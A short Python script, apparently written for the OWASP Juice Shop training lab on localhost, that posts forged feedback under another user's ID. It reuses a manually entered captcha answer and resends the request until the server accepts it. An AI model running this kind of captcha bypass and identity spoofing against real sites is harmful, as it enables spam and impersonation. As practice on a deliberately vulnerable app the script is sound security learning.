import requests

myobj={"UserId":2,"captchaId":0,"captcha":"","comment":"site heheheheh (***@juice-sh.op)","rating":0}
url = "http://127.0.0.1:3000/api/Feedbacks/"


#x = requests.get("http://localhost:3000/rest/captcha/")
#newcaptcha = x.json()
#myobj["captchaId"]=newcaptcha["captchaId"]
#myobj["captcha"]= newcaptcha["answer"]
while True:
    status = 0
    print("Captcha ID : ",end = "")
    cid = input().strip()
    print("Answer : ",end="")
    ans = input().strip()
    myobj["captchaId"]=int(cid)
    myobj["captcha"]=ans
    while status!=201:
        x = requests.post(url, data = myobj)
        status = x.status_code
    print(f"Status : {status}")
    text = x.text
    print(f"Response : {text}")
print("Sent 10 requests\nChallenge completed")

